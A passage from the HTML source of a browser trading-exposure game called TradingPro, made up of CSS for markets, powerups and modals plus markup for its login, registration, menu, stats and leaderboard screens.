         flex-wrap: wrap;
         height: 35px; /* Add fixed height */
         align-items: center; /* Add for vertical centering */
        }
        
        .score-item {
            color: #00ff00;
            font-weight: bold;
            margin: 2px 10px;
            font-size: 12px;
        }
        
        .difficulty-indicator {
            color: #00ffff;
            font-weight: bold;
        }
        
        .market-container {
    background: rgba(0,0,0,0.6);
    border-radius: 15px;
    padding: 15px; /* Reduced from 25px */
    max-width: 1200px;
    margin: 0 auto;
    box-shadow: 0 10px 40px rgba(0,0,0,0.3);
    border: 1px solid rgba(255,255,255,0.1);
}
        
        .powerups-container {
            background: rgba(156,39,176,0.2);
            border-radius: 15px;
            padding: 25px;
            max-width: 1200px;
            margin: 0 auto;
            box-shadow: 0 10px 40px rgba(156,39,176,0.2);
            border: 2px solid rgba(156,39,176,0.3);
            min-height: 300px;
        }
        
        .powerups-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .powerup-card {
            background: rgba(0,0,0,0.4);
            border-radius: 12px;
            padding: 20px;
            border: 1px solid rgba(255,255,255,0.1);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .powerup-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, #9C27B0, #E91E63);
        }
        
        .powerup-card:hover {
            transform: translateY(-3px);
            border-color: rgba(156,39,176,0.4);
            box-shadow: 0 8px 25px rgba(156,39,176,0.2);
        }
        
        .powerup-card.active {
            border-color: rgba(76,175,80,0.6);
            background: rgba(76,175,80,0.1);
            box-shadow: 0 0 20px rgba(76,175,80,0.3);
        }
        
        .powerup-card.active::before {
            background: linear-gradient(90deg, #4CAF50, #8BC34A);
        }
        
        .powerup-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
        
        .powerup-title {
            font-size: 16px;
            font-weight: bold;
            color: #ffffff;
        }
        
        .powerup-count {
            background: linear-gradient(135deg, #ffd700, #ffb300);
            color: #000;
            padding: 4px 8px;
            border-radius: 10px;
            font-size: 12px;
            font-weight: bold;
            min-width: 30px;
            text-align: center;
        }
        
        .powerup-description {
            color: rgba(255,255,255,0.8);
            font-size: 13px;
            margin-bottom: 15px;
            line-height: 1.4;
        }
        
        .powerup-status {
            font-size: 11px;
            color: #888;
            margin-bottom: 10px;
        }
        
        .powerup-button {
            width: 100%;
            background: linear-gradient(135deg, #9C27B0, #7B1FA2);
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s ease;
            font-size: 13px;
        }
        
        .powerup-button:hover:not(:disabled) {
            background: linear-gradient(135deg, #AB47BC, #8E24AA);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(156,39,176,0.3);
        }
        
        .powerup-button:disabled {
            background: #444;
            color: #888;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .powerup-cooldown {
            text-align: center;
            font-size: 11px;
            color: #ff9800;
            margin-top: 8px;
            font-weight: bold;
        }
        
        .market-row {
            display: flex;
            align-items: center;
            margin-bottom: 18px;
            height: 55px;
            position: relative;
            transition: all 0.3s ease;
        }
        
        .market-row:hover {
            transform: translateY(-1px);
        }
        
        .buy-btn, .sell-btn {
            width: 60px;
            height: 35px;
            border: none;
            color: white;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            font-size: 11px;
            position: relative;
            z-index: 20;
            flex-shrink: 0;
            transition: all 0.2s ease;
            box-shadow: 0 3px 6px rgba(0,0,0,0.2);
        }
        
        .buy-btn {
            background: linear-gradient(145deg, #4CAF50, #45a049);
            margin-right: 15px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .buy-btn:hover {
            background: linear-gradient(145deg, #5cbf60, #4CAF50);
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 5px 12px rgba(76,175,80,0.3);
        }
        
        .buy-btn:active {
            transform: translateY(0) scale(0.98);
        }
        
        .sell-btn {
            background: linear-gradient(145deg, #f44336, #da190b);
            margin-left: 15px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .sell-btn:hover {
            background: linear-gradient(145deg, #f66356, #f44336);
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 5px 12px rgba(244,67,54,0.3);
        }
        
        .sell-btn:active {
            transform: translateY(0) scale(0.98);
        }
        
        .exposure-container {
            flex: 1;
            height: 45px;
            position: relative;
            background: rgba(255,255,255,0.08);
            border-radius: 6px;
            margin: 0;
            border: 1px solid rgba(255,255,255,0.1);
            overflow: hidden;
        }
        
        .breach-countdown {
            position: absolute;
            top: 5px;
            right: 5px;
            width: 30px;
            height: 30px;
            z-index: 15;
        }
        
        .countdown-circle {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background: conic-gradient(#ff0000 0deg, #ff0000 var(--progress), transparent var(--progress));
            display: flex;
            align-items: center;
            justify-content: center;
            animation: timer-bounce 0.6s ease-in-out infinite;
            position: relative;
            border: 2px solid rgba(255,255,255,0.8);
        }
        
        .countdown-circle::before {
            content: '';
            position: absolute;
            top: 6px;
            left: 6px;
            right: 6px;
            bottom: 6px;
            background: rgba(0,0,0,0.8);
            border-radius: 50%;
            z-index: 1;
        }
        
        .countdown-text {
            color: white;
            font-size: 11px;
            font-weight: bold;
            text-shadow: 1px 1px 1px #000;
            position: relative;
            z-index: 2;
        }
        
        .exposure-bar {
            height: 100%;
            border-radius: 6px;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: absolute;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: inset 0 1px 3px rgba(255,255,255,0.2);
        }
        
        .exposure-bar.short {
            right: 50%;
            margin-right: 38px;
        }
        
        .exposure-bar.long {
            left: 50%;
            margin-left: 38px;
        }
        
        .exposure-bar.green {
            background: linear-gradient(135deg, #00ff00, #32ff32, #00cc00);
            box-shadow: inset 0 1px 3px rgba(255,255,255,0.2);
        }
        
        .exposure-bar.yellow {
            background: linear-gradient(135deg, #ffff00, #ffff32, #cccc00);
            box-shadow: inset 0 1px 3px rgba(255,255,255,0.2);
        }
        
        .exposure-bar.red {
            background: linear-gradient(135deg, #ff0000, #ff3232, #cc0000);
            box-shadow: inset 0 1px 3px rgba(255,255,255,0.2);
            animation: breach-pulse 1s ease-in-out infinite;
        }
        
        .exposure-bar.white {
            background: linear-gradient(135deg, #ffffff, #f0f0f0, #e0e0e0);
            box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
            animation: critical-pulse 0.7s ease-in-out infinite;
        }
        
        .market-info {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(145deg, rgba(0,0,0,0.95), rgba(20,20,20,0.95));
            padding: 6px 12px;
            border-radius: 8px;
            font-size: 12px;
            font-weight: bold;
            z-index: 10;
            border: 1px solid rgba(255,255,255,0.2);
            min-width: 85px;
            text-align: center;
            box-shadow: 0 4px 12px rgba(0,0,0,0.4);
            transition: all 0.3s ease;
        }
        
        .market-row:hover .market-info {
            transform: translate(-50%, -50%) scale(1.02);
            border-color: rgba(255,255,255,0.3);
        }
        
        .market-name {
            color: #ffffff;
            text-shadow: 0 1px 2px rgba(0,0,0,0.8);
        }
        
        .market-limit {
            color: #00d4ff;
            font-size: 10px;
            text-shadow: 0 1px 2px rgba(0,0,0,0.8);
        }
        
        .exposure-value {
            color: #ffeb3b;
            font-size: 10px;
            text-shadow: 0 1px 2px rgba(0,0,0,0.8);
            transition: color 0.3s ease;
        }
        
        .warning {
            animation: breach-shake 1.5s ease-in-out infinite;
        }
        
        .warning .exposure-container {
            border-color: rgba(255,0,0,0.5);
            background: rgba(255,0,0,0.05);
        }
        
        .critical-warning {
            animation: critical-shake 1s ease-in-out infinite;
        }
        
        .critical-warning .exposure-container {
            border-color: rgba(255,255,255,0.6);
            background: rgba(255,255,255,0.05);
        }
        
        .market-frozen {
            opacity: 0.5;
        }
        
        .market-frozen .exposure-container {
            background: rgba(0,255,255,0.1) !important;
            border-color: rgba(0,255,255,0.3) !important;
        }
        
        .volatility-shielded .exposure-container {
            background: rgba(76,175,80,0.1) !important;
            border-color: rgba(76,175,80,0.3) !important;
        }
        
        @keyframes breach-pulse {
            0%, 100% { 
                filter: brightness(1);
                transform: scaleY(1);
            }
            50% { 
                filter: brightness(1.1);
                transform: scaleY(1.02);
            }
        }
        
        @keyframes critical-pulse {
            0%, 100% { 
                filter: brightness(1);
                transform: scaleY(1);
            }
            50% { 
                filter: brightness(1.15);
                transform: scaleY(1.03);
            }
        }
        
        @keyframes breach-shake {
            0%, 100% { 
                transform: translateX(0);
            }
            25% { 
                transform: translateX(1px);
            }
            75% { 
                transform: translateX(-1px);
            }
        }
        
        @keyframes critical-shake {
            0%, 100% { 
                transform: translateX(0);
            }
            20% { 
                transform: translateX(2px);
            }
            40% { 
                transform: translateX(-2px);
            }
            60% { 
                transform: translateX(1px);
            }
            80% { 
                transform: translateX(-1px);
            }
        }
        
        @keyframes timer-bounce {
            0%, 100% { 
                transform: scale(1);
            }
            50% { 
                transform: scale(1.08);
            }
        }
        
        .market-row:hover .exposure-bar {
            filter: brightness(1.05);
        }
        
        .market-row.trade-feedback {
            animation: trade-success 0.5s ease-out;
        }
        
        @keyframes trade-success {
            0% { transform: translateX(0); }
            25% { transform: translateX(3px); }
            75% { transform: translateX(-3px); }
            100% { transform: translateX(0); }
        }
        
        .game-controls {
    text-align: center;
    margin-top: 12px; /* Reduced from 20px */
}
        
        .control-btn {
            background: #2196F3;
            color: white;
            border: none;
            padding: 10px 15px;
            margin: 0 5px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            font-size: 11px;
        }
        
        .control-btn:hover {
            background: #1976D2;
        }
        
        .paused {
            background: #FF9800;
        }
        
        .paused:hover {
            background: #F57C00;
        }
        
        .admin-btn {
            background: #9C27B0;
        }
        
        .admin-btn:hover {
            background: #7B1FA2;
        }
        
        .admin-panel {
            background: rgba(0,0,0,0.9);
            border: 2px solid rgba(156,39,176,0.5);
            border-radius: 10px;
            padding: 20px;
            margin: 20px auto;
            max-width: 600px;
            color: white;
            font-size: 12px;
        }
        
        .admin-section {
            margin-bottom: 20px;
            padding: 15px;
            background: rgba(255,255,255,0.05);
            border-radius: 8px;
        }
        
        .admin-section h3 {
            color: #9C27B0;
            margin-bottom: 10px;
            border-bottom: 1px solid rgba(156,39,176,0.3);
            padding-bottom: 5px;
        }
        
        .admin-control {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 10px 0;
            padding: 8px;
            background: rgba(255,255,255,0.05);
            border-radius: 4px;
        }
        
        .admin-control label {
            color: #ffffff;
            font-weight: bold;
            flex: 1;
            font-size: 11px;
        }
        
        .admin-control input {
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.3);
            color: white;
            padding: 4px 8px;
            border-radius: 4px;
            width: 70px;
            text-align: center;
            font-size: 10px;
        }
        
        .admin-control input:focus {
            outline: none;
            border-color: #9C27B0;
            box-shadow: 0 0 5px rgba(156,39,176,0.5);
        }
        
        .profile-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .modal-content {
         background: linear-gradient(145deg, rgba(30,60,114,0.95), rgba(42,82,152,0.95));
         border: 2px solid rgba(255,255,255,0.2);
         border-radius: 15px;
         padding: 30px;
         max-width: 500px;
         width: 90%;
         text-align: center;
         box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         max-height: 90vh;
         display: flex;
         flex-direction: column;
         overflow-y: auto;
}

        .leaderboard-tabs {
            display: flex;
            border-bottom: 2px solid rgba(255,255,255,0.1);
            margin-bottom: 25px;
        }

        .leaderboard-tab-button {
            flex: 1;
            background: none;
            border: none;
            color: rgba(255,255,255,0.6);
            padding: 12px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            position: relative;
            transition: all 0.3s ease;
            font-family: inherit;
        }

        .leaderboard-tab-button:hover {
            color: rgba(255,255,255,0.9);
        }

        .leaderboard-tab-button.active {
            color: #00d4ff;
        }

        .leaderboard-tab-button.active::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, #00d4ff, #0099cc);
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from { transform: scaleX(0); }
            to { transform: scaleX(1); }
        }

        .leaderboard-content {
            min-height: 300px;
        }

        .modal-scrollable {
            flex: 1;
            overflow-y: auto;
            margin: 20px 0;
            padding-right: 10px;
        }

        .modal-scrollable::-webkit-scrollbar {
            width: 6px;
        }

        .modal-scrollable::-webkit-scrollbar-track {
            background: rgba(255,255,255,0.1);
            border-radius: 3px;
        }

        .modal-scrollable::-webkit-scrollbar-thumb {
            background: rgba(255,255,255,0.3);
            border-radius: 3px;
        }
        
        .modal-title {
            color: #ffffff;
            margin-bottom: 20px;
            font-size: 18px;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        .form-label {
            color: #ffffff;
            font-weight: bold;
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        .form-input {
            width: 100%;
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.3);
            color: white;
            padding: 10px;
            border-radius: 5px;
            font-family: inherit;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #00d4ff;
            box-shadow: 0 0 8px rgba(0,212,255,0.5);
        }
        
        .modal-buttons {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 25px;
        }
        
        .modal-btn {
            background: #00d4ff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.2s ease;
        }
        
        .modal-btn:hover {
            background: #0099cc;
            transform: translateY(-1px);
        }
        
        .modal-btn.secondary {
            background: #666;
        }
        
        .modal-btn.secondary:hover {
            background: #555;
        }
        
        .global-effects-bar {
            background: rgba(0,0,0,0.6);
            padding: 10px 20px;
            margin-bottom: 15px;
            border-radius: 8px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
            min-height: 40px;
            display: none;
            align-items: center;
            justify-content: center;
        }
        
        .global-effects-bar.has-effects {
            display: flex;
        }
        
        .strike-icon {
            font-size: 14px;
            margin: 0 2px;
            transition: all 0.3s ease;
        }

        .strike-icon.active {
            color: #ff4444;
            text-shadow: 0 0 8px rgba(255,68,68,0.6);
        }

        .strike-icon.lost {
            color: #666;
            text-shadow: none;
            transform: scale(0.8);
            opacity: 0.5;
        }

        .strike-icon.warning {
            animation: strike-warning 1s ease-in-out infinite;
        }

        @keyframes strike-warning {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); filter: brightness(1.3); }
        }

        @keyframes fire-pulse {
            0%, 100% { transform: scale(1); filter: brightness(1); }
            50% { transform: scale(1.05); filter: brightness(1.2); }
        }
        
        .effect-indicator {
            padding: 4px 12px;
            border-radius: 15px;
            font-size: 12px;
            font-weight: bold;
            margin: 0 5px;
            display: inline-block;
        }
        
        .effect-freeze {
            background: linear-gradient(135deg, #00bcd4, #0097a7);
            color: white;
            animation: freeze-pulse 1s ease-in-out infinite;
        }
        
        .effect-shield {
            background: linear-gradient(135deg, #4caf50, #388e3c);
            color: white;
            animation: shield-pulse 1s ease-in-out infinite;
        }
        .effects-section {
    display: flex;
    align-items: center;
    gap: 8px;
    min-width: 180px;
    flex-shrink: 0;
}

.effects-section.hidden {
    display: none;
}

.effects-label {
    font-size: 12px;
    color: rgba(255,255,255,0.7);
    font-weight: 600;
}

.active-effects {
    display: flex;
    flex-wrap: wrap;
    gap: 6px;
    justify-content: flex-end;
    max-width: 300px;
    max-height: 50px;
    overflow-y: auto;
}

.active-effects::-webkit-scrollbar {
    height: 4px;
}

.active-effects::-webkit-scrollbar-track {
    background: rgba(255,255,255,0.1);
    border-radius: 2px;
}

.active-effects::-webkit-scrollbar-thumb {
    background: rgba(76,175,80,0.5);
    border-radius: 2px;
}

.active-effect {
    background: rgba(76,175,80,0.2);
    border: 1px solid rgba(76,175,80,0.5);
    border-radius: 12px;
    padding: 4px 8px;
    display: flex;
    align-items: center;
    gap: 4px;
    font-size: 10px;
    box-shadow: 0 2px 4px rgba(76,175,80,0.2);
    white-space: nowrap;
    flex-shrink: 0;
}

.effect-icon {
    font-size: 12px;
}

.effect-timer {
    color: #4CAF50;
    font-weight: bold;
}

.powerup-cooldown-indicator {
    position: absolute;
    bottom: -5px;
    right: -5px;
    background: linear-gradient(135deg, #2196F3, #1976D2);
    color: white;
    font-size: 9px;
    font-weight: 900;
    min-width: 18px;
    height: 18px;
    border-radius: 9px;
    display: flex;
    align-items: center;
    justify-content: center;
    border: 2px solid rgba(255,255,255,0.8);
    box-shadow: 0 2px 4px rgba(0,0,0,0.3);
}
        
        @keyframes freeze-pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        @keyframes shield-pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        .game-over-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999 !important;
        }

        .game-over-content {
            background: linear-gradient(145deg, rgba(30,60,114,0.95), rgba(42,82,152,0.95));
            border: 3px solid rgba(255,69,0,0.6);
            border-radius: 20px;
            padding: 40px;
            max-width: 600px;
            width: 90%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.7);
            animation: game-over-appear 0.5s ease-out;
        }

        @keyframes game-over-appear {
            0% { 
                opacity: 0; 
                transform: scale(0.8) translateY(50px); 
            }
            100% { 
                opacity: 1; 
                transform: scale(1) translateY(0); 
            }
        }

        .game-over-title {
            color: #ff4444;
            font-size: 36px;
            font-weight: 900;
            margin-bottom: 10px;
            text-shadow: 0 4px 8px rgba(255,68,68,0.5);
            animation: title-pulse 2s ease-in-out infinite;
        }

        @keyframes title-pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.02); }
        }

        .game-over-subtitle {
            color: rgba(255,255,255,0.8);
            font-size: 16px;
            margin-bottom: 30px;
        }

        .game-over-stats {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin: 30px 0;
        }

        .game-over-stat {
            background: rgba(0,0,0,0.4);
            border-radius: 12px;
            padding: 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .stat-value {
            font-size: 28px;
            font-weight: 700;
            color: #00ff88;
            margin-bottom: 5px;
            text-shadow: 0 2px 4px rgba(0,255,136,0.3);
        }

        .stat-label {
            color: rgba(255,255,255,0.7);
            font-size: 14px;
            font-weight: 500;
        }

        .game-over-summary {
            background: rgba(255,255,255,0.08);
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid rgba(255,255,255,0.15);
        }

        .summary-title {
            color: #ffd700;
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 15px;
        }

        .summary-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 8px 0;
            padding: 8px 0;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }

        .summary-item:last-child {
            border-bottom: none;
        }

        .summary-label {
            color: rgba(255,255,255,0.8);
            font-size: 14px;
        }

        .summary-value {
            color: #00ff88;
            font-weight: 700;
            font-size: 14px;
        }

        .game-over-actions {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 30px;
        }

        .game-over-btn {
            background: linear-gradient(135deg, #00d4ff, #0099cc);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 16px rgba(0,212,255,0.3);
        }

        .game-over-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0,212,255,0.4);
        }

        .game-over-btn.secondary {
            background: linear-gradient(135deg, #666, #555);
            box-shadow: 0 4px 16px rgba(102,102,102,0.3);
        }

        .game-over-btn.secondary:hover {
            box-shadow: 0 6px 20px rgba(102,102,102,0.4);
        }
        
        /* Optimized Powerup Bar */
        .powerup-bar {
    display: flex;
    align-items: center;
    margin-bottom: 12px; /* Reduced from 20px */
    padding: 12px 15px; /* Reduced padding */
    background: rgba(156,39,176,0.15);
    border-radius: 12px;
    border: 2px solid rgba(156,39,176,0.3);
    box-shadow: 0 4px 12px rgba(156,39,176,0.2);
    gap: 15px;
    min-height: 70px; /* Ensure enough space for badges */
}

.powerup-viewport {
    overflow: hidden;
    position: relative;
    height: 55px;
    flex: 1;
    padding: 8px 8px 0 0; /* Top and right padding to prevent badge cutoff */
}

.powerup-label {
    font-size: 14px;
    color: #E91E63;
    font-weight: 700;
    letter-spacing: 1px;
    text-shadow: 0 0 8px rgba(233,30,99,0.5);
    flex-shrink: 0;
}

.powerup-main-section {
    display: flex;
    align-items: center;
    gap: 8px;
    flex: 1;
}

.scroll-button {
    width: 30px;
    height: 45px;
    background: rgba(156,39,176,0.3);
    border: 1px solid rgba(156,39,176,0.5);
    border-radius: 8px;
    color: #E91E63;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 14px;
    transition: all 0.2s ease;
    flex-shrink: 0;
}

.scroll-button:hover:not(.disabled) {
    background: rgba(156,39,176,0.5);
    color: white;
}

.scroll-button.disabled {
    opacity: 0.3;
    cursor: not-allowed;
}

.scroll-button.hidden {
    display: none;
}

.powerup-viewport {
    overflow: hidden;
    position: relative;
    height: 55px;
    flex: 1;
    padding: 5px 0;
}

.powerup-icons {
    display: flex;
    gap: 12px;
    transition: transform 0.3s ease;
}

.powerup-icon-quick {
    width: 45px;
    height: 45px;
    background: linear-gradient(135deg, #9C27B0, #7B1FA2);
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 20px;
    cursor: pointer;
    transition: all 0.3s ease;
    position: relative;
    border: 2px solid rgba(255,255,255,0.2);
    box-shadow: 0 4px 8px rgba(156,39,176,0.3);
    flex-shrink: 0;
}

.powerup-icon-quick:hover {
    transform: translateY(-3px) scale(1.05);
    box-shadow: 0 8px 16px rgba(156,39,176,0.5);
    background: linear-gradient(135deg, #AB47BC, #8E24AA);
}

.powerup-icon-quick.disabled {
    background: linear-gradient(135deg, #555, #444);
    cursor: not-allowed;
    opacity: 0.5;
}

.powerup-icon-quick.disabled:hover {
    transform: none;
    box-shadow: 0 4px 8px rgba(156,39,176,0.3);
    background: linear-gradient(135deg, #555, #444);
}

.powerup-count-quick {
    position: absolute;
    top: -6px;
    right: -6px;
    background: linear-gradient(135deg, #ffd700, #ffb300);
    color: #000;
    font-size: 11px;
    font-weight: 900;
    min-width: 20px;
    height: 20px;
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    border: 2px solid rgba(255,255,255,0.8);
    box-shadow: 0 2px 4px rgba(0,0,0,0.3);
}

.effects-section.hidden {
    display: none;
}


    </style>
</head>
<body>

<!-- Authentication Screen -->
<div class="auth-screen" id="authScreen">
    <div class="auth-container">
        <!-- Login Form -->
        <div id="loginForm">
            <div class="auth-header">
                <h1 class="auth-title">Welcome Back</h1>
                <p class="auth-subtitle">Sign in to continue your trading journey</p>
            </div>
            
            <form class="auth-form" onsubmit="handleLogin(event)">
                <div class="auth-input-group">
                    <label class="auth-label">Email</label>
                    <input type="email" class="auth-input" id="loginEmail" placeholder="Enter your email" required>
                </div>
                
                <div class="auth-input-group">
                    <label class="auth-label">Password</label>
                    <input type="password" class="auth-input" id="loginPassword" placeholder="Enter your password" required>
                </div>
                
                <div id="loginError" class="auth-error" style="display: none;"></div>
                
                <button type="submit" class="auth-button" id="loginButton">
                    Sign In
                </button>
            </form>
            
            <div class="auth-toggle">
                Don't have an account? <a href="#" class="auth-link" onclick="showRegisterForm()">Sign up</a>
            </div>
            
            <div class="guest-option">
                <button class="guest-button" onclick="continueAsGuest()">Continue as Guest</button>
            </div>
        </div>
        
        <!-- Register Form -->
        <div id="registerForm" style="display: none;">
            <div class="auth-header">
                <h1 class="auth-title">Join TradingPro</h1>
                <p class="auth-subtitle">Create your account to save progress</p>
            </div>
            
            <form class="auth-form" onsubmit="handleRegister(event)">
                <div class="auth-input-group">
                    <label class="auth-label">Email</label>
                    <input type="email" class="auth-input" id="registerEmail" placeholder="Enter your email" required>
                </div>
                
                <div class="auth-input-group">
                    <label class="auth-label">Username</label>
                    <input type="text" class="auth-input" id="registerUsername" placeholder="Choose a username" required minlength="3" maxlength="20">
                </div>
                
                <div class="auth-input-group">
                    <label class="auth-label">Password</label>
                    <input type="password" class="auth-input" id="registerPassword" placeholder="Create a password" required minlength="6">
                </div>
                
                <div class="auth-input-group">
                    <label class="auth-label">Confirm Password</label>
                    <input type="password" class="auth-input" id="confirmPassword" placeholder="Confirm your password" required>
                </div>
                
                <div id="registerError" class="auth-error" style="display: none;"></div>
                <div id="registerSuccess" class="auth-success" style="display: none;"></div>
                
                <button type="submit" class="auth-button" id="registerButton">
                    Create Account
                </button>
            </form>
            
            <div class="auth-toggle">
                Already have an account? <a href="#" class="auth-link" onclick="showLoginForm()">Sign in</a>
            </div>
            
            <div class="guest-option">
                <button class="guest-button" onclick="continueAsGuest()">Continue as Guest</button>
            </div>
        </div>
    </div>
</div>

<!-- Menu Screen -->
<div class="menu-screen" id="menuScreen">
    <div class="background-pattern"></div>
    
    <div class="menu-content">
        <div class="hero-section">
            <div class="app-icon"></div>
            <h1 class="app-title">TradingPro!</h1>
            <p class="app-tagline">Master market exposure</p>
        </div>
        
        <div class="floating-card">
            <div class="menu-user-info">
                <div class="menu-user-name" id="menuUsername">Guest Trader</div>
                <div class="menu-level-container">
                    <div class="menu-level-circle" id="menuLevelCircle">L1</div>
                    <div class="menu-progress-info">
                        <div class="menu-progress-bar">
                            <div class="menu-progress-fill" id="menuXpBar" style="width: 0%;"></div>
                        </div>
                        <div class="menu-progress-text" id="menuXpText">0 / 100 XP</div>
                    </div>
                </div>
            </div>
            
            <div class="menu-stats-grid">
                <div class="menu-stat-card">
                    <div class="menu-stat-number" id="menuGamesPlayed">0</div>
                    <div class="menu-stat-label">Games</div>
                </div>
                <div class="menu-stat-card">
                    <div class="menu-stat-number" id="menuBestScore">0</div>
                    <div class="menu-stat-label">Best Score</div>
                </div>
                <div class="menu-stat-card">
                    <div class="menu-stat-number" id="menuCoins" style="color: #ffd700;">0</div>
                    <div class="menu-stat-label">Coins</div>
                </div>
                <div class="menu-stat-card">
                    <div class="menu-stat-number" id="menuAssets">3</div>
                    <div class="menu-stat-label">Assets</div>
                </div>
            </div>
        </div>
        
        <div class="floating-card">
            <div class="menu-section-title">Difficulty</div>
            <div class="menu-difficulty-pills">
                <div class="menu-difficulty-pill" data-difficulty="1" onclick="selectMenuDifficulty(1)">Easy</div>
                <div class="menu-difficulty-pill active" data-difficulty="2" onclick="selectMenuDifficulty(2)">Normal</div>
                <div class="menu-difficulty-pill" data-difficulty="3" onclick="selectMenuDifficulty(3)">Hard</div>
            </div>
        </div>
        
        <div class="menu-main-actions">
            <button class="menu-action-btn" onclick="startGame()"> Start Trading</button>
            
            <div class="menu-secondary-actions">
                <button class="menu-secondary-btn" onclick="showShop()"> Shop</button>
                <button class="menu-secondary-btn" onclick="showCareer()"> Career</button>
                <button class="menu-secondary-btn" onclick="showInstructions()"> Guide</button>
                <button class="menu-secondary-btn" onclick="showLeaderboard()"> Leaderboard</button>
            </div>
            
            <!-- Logout button (only shows when logged in) -->
            <button class="menu-action-btn logout-btn" id="logoutBtn" onclick="handleLogout()" style="display: none; background: linear-gradient(135deg, #f44336, #d32f2f);">
                 Logout
            </button>

            <!-- Create Account button (only shows for guests) -->
            <button class="menu-action-btn" id="createAccountBtn" onclick="guestCreateAccount()" style="display: none; background: linear-gradient(135deg, #4CAF50, #45a049);">
                 Create Account
            </button>
        </div>
        
        <div class="menu-version-info">Trading Exposure Manager v2.1</div>
    </div>
</div>

<!-- Stats Modal -->
<div class="profile-modal" id="statsModal" style="display: none;">
    <div class="modal-content">
        <h2 class="modal-title"> Player Statistics</h2>
        <div style="text-align: left; margin: 20px 0;">
            <div style="margin-bottom: 10px;"><strong>Total Games:</strong> <span id="totalGames">0</span></div>
            <div style="margin-bottom: 10px;"><strong>Best Score:</strong> <span id="bestScore">0</span></div>
            <div style="margin-bottom: 10px;"><strong>Total XP:</strong> <span id="totalXP">0</span></div>
            <div style="margin-bottom: 10px;"><strong>Level:</strong> <span id="currentLevel">1</span></div>
            <div style="margin-bottom: 10px;"><strong>Trades:</strong> <span id="totalTrades">0</span></div>
            <div style="margin-bottom: 10px;"><strong>Breaches Fixed:</strong> <span id="breachesFixed">0</span></div>
            <div style="margin-bottom: 10px;"><strong>Win Rate:</strong> <span id="winRate">0%</span></div>
            <div style="margin-bottom: 10px;"><strong>Total Coins:</strong> <span id="totalCoins">0</span></div>
        </div>
        <div class="modal-buttons">
            <button class="modal-btn" onclick="closeStatsModal()">Close</button>
        </div>
    </div>
</div>

<!-- Leaderboard Modal -->
<div class="profile-modal" id="leaderboardModal" style="display: none;">
    <div class="modal-content" style="max-width: 500px;">
        <h2 class="modal-title"> Leaderboard</h2>
        
        <div class="leaderboard-tabs">
            <button class="leaderboard-tab-button active" onclick="switchLeaderboardTab('level')">
                 Highest Level
            </button>
            <button class="leaderboard-tab-button" onclick="switchLeaderboardTab('score')">
                 Top Scores
            </button>
        </div>
        
        <div class="modal-scrollable">
            <div id="levelLeaderboard" class="leaderboard-content">
                <div style="color: #888; text-align: center; padding: 20px;">Loading...</div>
            </div>
            
